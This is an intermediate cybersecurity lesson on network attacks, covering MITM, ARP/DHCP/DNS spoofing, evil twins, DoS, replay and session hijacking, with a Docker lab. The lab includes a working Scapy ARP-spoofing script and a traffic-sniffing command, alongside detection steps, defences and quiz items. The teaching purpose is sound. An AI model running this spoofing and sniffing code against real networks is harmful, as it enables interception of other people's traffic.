---
id: 8a4d65d6-c6b3-4285-9768-c2aeff7724cf
---

# Network Attacks

**A network attack goes after the connections between computers: listening in on traffic, redirecting it through the attacker, or flooding it so nobody gets through.**

## Before you start
<!-- bite: e4adf67d-c211-4fdb-aec2-5770a41c9184 -->

You should have:

- Built firewalls, zones and a WireGuard tunnel → [[cybersecurity/03-network-security/index|network security]].
- Met IP addresses, MAC addresses and the local network → [[networking/02-the-link-layer|the link layer]].
- Docker and Docker Compose on your laptop.

After this lesson you will be able to:

1. Explain a man-in-the-middle attack, and why encryption makes it far less useful.
2. Explain why ARP, DHCP and plain DNS can be spoofed, and run an ARP-spoofing attack in an isolated Docker lab.
3. Spot ARP spoofing in an ARP table, and name the defences.
4. Describe Wi-Fi attacks (evil twin, deauth), denial of service, replay and session hijacking, each with its defence.

**Study route.** Kid version and §1–4, then the worked example: an ARP-spoofing attack and its detection, entirely inside Docker on your laptop.

## What network attacks are
<!-- bite: 09189416-d2c3-44f6-9384-d5d480afb7de -->

The network-security section built defences: a firewall, zones, a tunnel, an intrusion detection system. This lesson is the other side: the attacks those defences exist for. Many of them work because the oldest network protocols were designed for friendly networks, and simply believe whatever they're told.

The hotel Wi-Fi, the café hotspot, the shared office network: on all of them, the person next to you is on the same local network as you. You'll see exactly what that lets them do by doing it yourself, safely, between containers you own.

## The kid version
<!-- bite: e2db7a3b-652d-4666-99a4-464891da38f9 -->

Imagine a class where notes are passed from desk to desk to reach the teacher. A sneaky pupil in the middle tells everyone, "I sit next to the teacher now, pass the notes to me." Everyone believes him, because nobody ever checks. Now every note goes through his hands. He can read them, change them, or bin them.

That's a man-in-the-middle attack, and on a local network, the "I sit next to the teacher now" message is a forged ARP reply.

**Where the analogy stops working.** If the notes are written in a code only the teacher can read, and sealed so any change shows, the sneaky pupil can still carry them but can't read or change them. That's what HTTPS, SSH and a VPN do. Network attacks hurt most when traffic is unencrypted, which is why encryption in transit is the big defence.

## 1. Man in the middle — the umbrella
<!-- bite: be3f554d-a0d8-40ff-91c9-31a9ae857f52 -->

A **man-in-the-middle (MITM)** attack puts the attacker between two parties who think they're talking directly. Everything passes through the attacker, who can read it, change it, or block it.

Most of the attacks in this lesson are just different ways of getting into the middle: lying about addresses (ARP, DHCP, DNS spoofing), or offering a fake Wi-Fi network (an evil twin).

What the attacker gets once in the middle depends on encryption. Against plain HTTP, everything: passwords, cookies, pages they can rewrite. Against HTTPS with a valid certificate, very little: they see which sites you visit and how much data flows, but can't read or change it without breaking TLS or getting you to accept a fake certificate. That's why HSTS, from the web-security section, matters: it stops an attacker in the middle quietly keeping you on HTTP.

## 2. The trusting protocols — ARP, DHCP and DNS
<!-- bite: 430a4679-9e74-4f1c-b818-45c4694c7962 -->

Three protocols every network relies on were built with no way to check who's talking. Each can be lied to.

1. **ARP** turns an IP address into a MAC address on the local network: "who has 10.9.0.2?" … "I do, my MAC is …". Anyone can answer, even when nobody asked, and devices believe the latest answer. **ARP spoofing** sends false answers, so a victim sends the gateway's traffic to the attacker. That's the worked example.
2. **DHCP** hands out addresses when a device joins a network, including which gateway and DNS server to use. A **rogue DHCP server** answers first and hands out *its own* address as the gateway.
3. **DNS** turns names into IP addresses. **DNS spoofing** gives a false answer, so `mybank.com` leads to the attacker's server. Combined with a fake login page, that's how pharming works.

The defences add checking where the protocol had none: switches that inspect ARP and DHCP traffic (**dynamic ARP inspection** and **DHCP snooping**), **DNSSEC** to sign DNS answers, and encrypted DNS. And underneath all of them: encrypt the traffic itself, so being in the middle gains little.

## 3. Wi-Fi attacks
<!-- bite: f5a2fc8b-8c99-4bed-ac52-6099c9417845 -->

Wireless adds attacks that only need the attacker to be nearby.

1. **Evil twin** — a fake access point with the same name as a real one, like "Cafe_Free_WiFi". Phones that have joined that name before may connect automatically, and the attacker is now the gateway for everything.
2. **Deauthentication** — forged "disconnect" messages that kick devices off a network, to push them onto an evil twin or capture a fresh handshake to crack offline (as in [[cybersecurity/02-ethical-hacking/11-wifi-security-testing|Wi-Fi security testing]]).
3. **Weak encryption** — WEP is broken; WPA2 with a weak passphrase falls to an offline crack.

Defences: **WPA3**, which protects management messages so forged disconnects don't work, and resists offline cracking; long passphrases; and, on any public Wi-Fi, assume an evil twin, rely on HTTPS everywhere, and use a VPN.

## 4. Floods, replays and stolen sessions
<!-- bite: ffd9da49-7ac2-4571-b197-d3ec7d8a8af0 -->

Three more you'll meet constantly.

1. **Denial of service (DoS)** — overwhelming a service so real users can't reach it. A **DDoS** uses thousands of hacked machines (a **botnet**) at once. **Amplification** attacks send small requests to open servers with the victim's address forged as the sender, so huge replies land on the victim. Defences: a DDoS-protection or CDN service in front of you, rate limiting, and spare capacity.
2. **Replay** — capturing a valid message, like a login or a payment instruction, and sending it again later. Defences: nonces, timestamps and short-lived tokens, like the webhook replay check in [[cybersecurity/05-cryptography/03-hashing-and-integrity|hashing and integrity]].
3. **Session hijacking** — stealing a valid session cookie, by sniffing plain HTTP, through XSS, or from malware, and using it to be the victim without their password. Defences: HTTPS everywhere, `HttpOnly` and `Secure` cookies, and sessions that expire and are tied to the device.

## Terms used in this lesson
<!-- bite: 670172b9-5793-4094-92a5-ea3aa84b9e2d -->

1. **MITM (man in the middle)**: The letters stand for those words. It's an attacker secretly placed between two parties, passing their traffic along while reading or changing it.
2. **MAC address**: This is the hardware address of a network card, used to deliver frames on the local network.
3. **ARP (Address Resolution Protocol)**: The letters stand for those words. It's how a device finds the MAC address for an IP address on its local network.
4. **ARP spoofing**: This is also called **ARP poisoning**. It's sending false ARP replies so traffic meant for one IP goes to the attacker's MAC.

## Terms used in this lesson: Wi-Fi and floods
<!-- bite: c2a2c550-b66f-45e0-864f-10c55a20bfee -->

The rest of the terms name the wireless attacks and the flooding ones.

5. **Evil twin**: This is a fake Wi-Fi access point with the same name as a real one.
6. **Deauthentication attack**: This is forging "disconnect" messages to kick devices off a Wi-Fi network.
7. **DDoS (distributed denial of service)**: The letters stand for those words. It's a flood of traffic from many machines at once, to make a service unavailable.
8. **Botnet**: This is a network of hacked machines controlled by one attacker, often used for DDoS and spam.

## Worked example — ARP spoofing in an isolated lab
<!-- bite: 2a10caeb-cd74-4de5-993d-530824de0ae1 -->

Everything here runs between three containers on a private Docker network on your laptop: a "gateway", a victim, and an attacker. Nothing touches a real network. Make a folder `arp-lab` and save this as `compose.yaml`:

```yaml
services:
  gateway:
    image: alpine:3.20
    command: sleep infinity
    networks: { lan: { ipv4_address: 10.9.0.2 } }
  victim:
    image: alpine:3.20
    command: sh -c "while true; do ping -c1 -W1 10.9.0.2 >/dev/null; sleep 1; done"
    networks: { lan: { ipv4_address: 10.9.0.3 } }
  attacker:
    image: python:3.12-slim
    command: sh -c "pip install --quiet scapy && sleep infinity"
    cap_add: [NET_ADMIN, NET_RAW]
    sysctls: { net.ipv4.ip_forward: 1 }      # pass traffic on, so the victim notices nothing
    volumes: ["./spoof.py:/spoof.py"]
    networks: { lan: { ipv4_address: 10.9.0.4 } }
networks:
  lan:
    ipam: { config: [{ subnet: 10.9.0.0/24 }] }
```

The victim pings the gateway once a second, like a device quietly using its network.

## Worked example: the forged reply
<!-- bite: 3e8e9d83-a640-4b41-9cd5-8d6b14a5babd -->

Save the attack as `spoof.py`, beside `compose.yaml`. It's a few lines of Scapy, a Python library for building packets by hand:

```python
# spoof.py: tell the victim that the gateway's IP is at the attacker's MAC.
import time
from scapy.all import ARP, Ether, getmacbyip, sendp

VICTIM, GATEWAY = "10.9.0.3", "10.9.0.2"
victim_mac = getmacbyip(VICTIM)
lie = Ether(dst=victim_mac) / ARP(op=2, pdst=VICTIM, hwdst=victim_mac, psrc=GATEWAY)
while True:
    sendp(lie, verbose=False)      # "10.9.0.2 is at <my MAC>", every 2 seconds
    time.sleep(2)
```

`op=2` makes it an ARP *reply*, an answer nobody asked for. `psrc=GATEWAY` claims to be the gateway. The sender's MAC is left to default, so it's the attacker's own. Sending it every two seconds keeps the victim's table poisoned even if the real gateway answers.

## Worked example: before and after
<!-- bite: 0e200848-ffca-40f3-ad0e-977dabf9ec26 -->

Start the lab and look at the victim's ARP table:

```bash
docker compose up -d
docker compose exec victim ip neigh          # before
docker compose exec -d attacker python /spoof.py
sleep 5
docker compose exec victim ip neigh          # after
```

**Predict first:** after the attack, which MAC will the victim list for `10.9.0.2`? Before, it's the gateway's own MAC. After, it's the **attacker's**:

## Worked example: the attacker is now in the middle
<!-- bite: 0578a2a0-6df5-409b-beda-25092d2f73ff -->

Here is what the attack did to the victim's view of the network.

![Two panels: before ARP spoofing, the victim (10.9.0.3) sends traffic for the gateway (10.9.0.2) straight to the gateway's MAC address ending 02; after forged ARP replies, the victim believes 10.9.0.2 is at the attacker's MAC ending 04, so its traffic detours through the attacker (10.9.0.4), who reads it and forwards it on.](../images/at-arp-spoofing.svg)

The victim's pings still get answers, because the attacker forwards them on. From the victim's side nothing looks wrong, and every packet to the gateway now passes through the attacker.

## Worked example: see the traffic, then catch the attack
<!-- bite: aca50f0e-245e-473c-87e6-1e1e155bcb66 -->

Prove the attacker really is in the middle, by sniffing the victim's pings from the attacker's container:

```bash
docker compose exec attacker python -c \
  "from scapy.all import sniff; sniff(filter='icmp and host 10.9.0.3', count=4, prn=lambda p: print(p.summary()))"
```

Now the defender's view. Back in the victim's `ip neigh` output, two different IPs (`10.9.0.2` and `10.9.0.4`) share **one MAC address**. On a normal network each machine has its own MAC, so a shared one is the classic sign of ARP spoofing. One line finds it:

```bash
docker compose exec victim sh -c "ip neigh | awk '{print \$5}' | sort | uniq -d"   # prints the duplicated MAC
```

On a real network, tools like `arpwatch` log "changed ethernet address" whenever an IP's MAC suddenly changes, and managed switches can block forged replies outright with dynamic ARP inspection. Finish with `docker compose down`.

## Common pitfalls and traps
<!-- bite: fe7263c8-ab25-44f2-92b4-28d1056515bd -->

1. **Trusting the local network.** Hotel, café and office Wi-Fi put strangers on your network segment. Assume someone could be in the middle.
2. **Thinking HTTPS makes MITM harmless.** It protects contents, but the attacker still sees which sites you visit, and a user who clicks through a certificate warning hands everything over. Never click through.
3. **Plain HTTP anywhere**, even "just the login redirect". That's the gap MITM uses. HTTPS plus HSTS everywhere.
4. **Auto-joining known Wi-Fi names.** Evil twins rely on it. Forget public networks after use.
5. **Treating DDoS as something you handle alone.** A big flood overwhelms any single server. Put a protection service in front before you need it.

## Check your understanding
<!-- bite: e3d348cb-0bfa-40b9-88c4-d550e5d80205 -->

Try each one before you open the answer.

1. <!-- q: mcq id="cbb25407" -->
   On a hotel network, an attacker gets into the middle of a guest's traffic. The guest logs into a site over HTTPS with a valid certificate and HSTS. What can the attacker see?

   - [ ] The guest's password.
   - [x] Which site the guest is connecting to and how much data flows, but not the contents.
   - [ ] Everything, because they're in the middle.
   - [ ] Nothing at all.

   <details><summary>Answer</summary>

   TLS hides and protects the contents, and HSTS stops the attacker downgrading the connection to HTTP. The attacker still sees the destination and traffic volume, which is metadata, not the password.

   </details>

2. <!-- q: mcq id="1b5a230b" -->
   Why can an attacker on the same local network make a victim send them the gateway's traffic, just by sending ARP replies?

   - [ ] ARP replies are encrypted with a weak key.
   - [x] ARP has no way to check who's answering, and devices accept replies even when they didn't ask.
   - [ ] The gateway forwards everything to every device.
   - [ ] The attacker needs the victim's password first.

   <details><summary>Answer</summary>

   ARP was designed for friendly networks: any device can answer "IP X is at my MAC", unasked, and the victim updates its table. That trust is what ARP spoofing abuses.

   </details>

3. <!-- q: mcq id="65635e4f" -->
   A victim's ARP table shows: `10.0.0.1 → aa:bb:cc:00:00:07` and `10.0.0.7 → aa:bb:cc:00:00:07`. 10.0.0.1 is the gateway. What does this suggest?

   - [ ] The table is normal.
   - [x] The device at 10.0.0.7 is probably ARP-spoofing the gateway, because two IPs share one MAC.
   - [ ] The gateway has two network cards.
   - [ ] 10.0.0.7 is the real gateway.

   <details><summary>Answer</summary>

   Normally each machine has its own MAC, so the gateway's IP mapping to another device's MAC is the classic sign of ARP spoofing. That device is likely in the middle of the victim's traffic.

   </details>

4. <!-- q: gap id="b0f3de80" answers="evil twin" -->
   An attacker sets up a Wi-Fi access point named "Airport_Free_WiFi", the same name as the airport's real network, so travellers' phones connect to it. This is called an ___ attack.

   <details><summary>Answer</summary>

   An evil twin. The attacker becomes the gateway for everyone who joins, which is why public Wi-Fi should be treated as hostile: HTTPS everywhere and a VPN.

   </details>

5. <!-- q: mcq id="0208ce0e" -->
   An attacker records a valid "transfer ₦10,000 to account X" request between an app and its server, then sends the exact same request again an hour later, and it's processed twice. Which attack is this, and what stops it?

   - [ ] DDoS; stopped by rate limiting.
   - [ ] ARP spoofing; stopped by dynamic ARP inspection.
   - [x] A replay attack; stopped by a unique nonce or timestamp in each signed request, so a repeat is rejected.
   - [ ] Session hijacking; stopped by `HttpOnly` cookies.

   <details><summary>Answer</summary>

   Replay reuses a genuine message. Including a one-time value or a timestamp in what's signed, and rejecting repeats or old messages, makes a copy worthless.

   </details>

6. <!-- q: open id="fa39255a" -->
   Many network attacks exploit ARP, DHCP and DNS. Explain what these three have in common that makes them attackable, and the two broad defences that apply across all of them.

   <details><summary>Answer</summary>

   All three were designed to trust whatever answer they get: there's no built-in check of who sent an ARP reply, a DHCP offer or a plain DNS answer, so an attacker can forge them to redirect traffic. The broad defences are adding authentication where it was missing (dynamic ARP inspection, DHCP snooping, DNSSEC, encrypted DNS, network segmentation so attackers aren't on your segment) and encrypting the traffic itself (TLS, SSH, VPNs), so that even an attacker who gets into the middle can't read or change anything.

   </details>

## Practice — run the lab, then defend it
<!-- bite: c53907d9-13b6-48d8-91fa-efda78ca43bc -->

**Task.** Run the worked example end to end, then add a defence.

1. Run the lab and record the victim's ARP table before and after, and the four sniffed packets.
2. Stop forwarding (remove the `sysctls` line, `docker compose up -d` again, restart `spoof.py`). What happens to the victim's pings now, and what kind of attack has it become?
3. Defend the victim with a static ARP entry for the gateway: `ip neigh replace 10.9.0.2 lladdr <gateway-MAC> nud permanent dev eth0` (run as root in the victim, with `cap_add: [NET_ADMIN]` added to it). Rerun the attack. Does the table change?

## Practice: when your lab is done
<!-- bite: 3b009591-f862-4d5a-973d-0f4229a758ad -->

Here is how you know the task is finished.

**Done when:** you have before and after ARP tables, the sniffed packets, a one-sentence answer for step 2, and proof the static entry held during the attack. Record it in `cybersecurity/LIVE-RUNS-TODO.md`, and run `docker compose down`.

## Before moving on
<!-- bite: 9e4f8487-b34f-46f0-80cb-fc3bc60fda9a -->

You can now explain man-in-the-middle attacks and why encryption limits them, explain why ARP, DHCP and plain DNS can be spoofed, run and detect ARP spoofing in a lab, and describe Wi-Fi attacks, DoS, replay and session hijacking with their defences.

**Recap for later lookup:** MITM = attacker in the path; TLS + HSTS keep contents safe. ARP, DHCP, DNS trust any answer; defend with DAI, DHCP snooping, DNSSEC, encrypted DNS, and segmentation. ARP spoofing shows as two IPs sharing one MAC. Evil twin, deauth: WPA3, VPN on public Wi-Fi. DDoS: a protection service in front. Replay: nonces, timestamps. Session hijacking: HTTPS, `HttpOnly`/`Secure`, short sessions.

Next: [[cybersecurity/06-attacks-and-threats/03-web-application-attacks|web application attacks]], where the target is the app itself.

## Related
<!-- bite: 02cbc624-6b58-49cb-9141-7865085018af -->

- [[cybersecurity/03-network-security/index|Network security]] — the defences against these attacks, built on your VPS.
- [[cybersecurity/02-ethical-hacking/11-wifi-security-testing|Wi-Fi security testing]] — the deauth and handshake crack, done on your own router.
- [[networking/02-the-link-layer|The link layer]] — how ARP and MAC addresses work.

## About this lesson
<!-- bite: 4681a082-3791-4af1-b400-2573151868ee -->

**Level:** Intermediate. **Covers:** man-in-the-middle attacks and what encryption leaves visible, ARP, DHCP and DNS spoofing and their defences, evil twins, deauthentication and weak Wi-Fi, DoS, DDoS and amplification, replay and session hijacking, with an isolated Docker lab that ARP-spoofs a container, sniffs its traffic and detects the attack. **Where it sits:** lesson 2 of the [[cybersecurity/06-attacks-and-threats/index|Attacks and Threats]] section. **Sources:** the original vault note (from the roadmap.sh cyber-security roadmap), rebuilt with a hands-on lab. `[reference]` — the lab hasn't been run yet; tracked in `cybersecurity/LIVE-RUNS-TODO.md`.
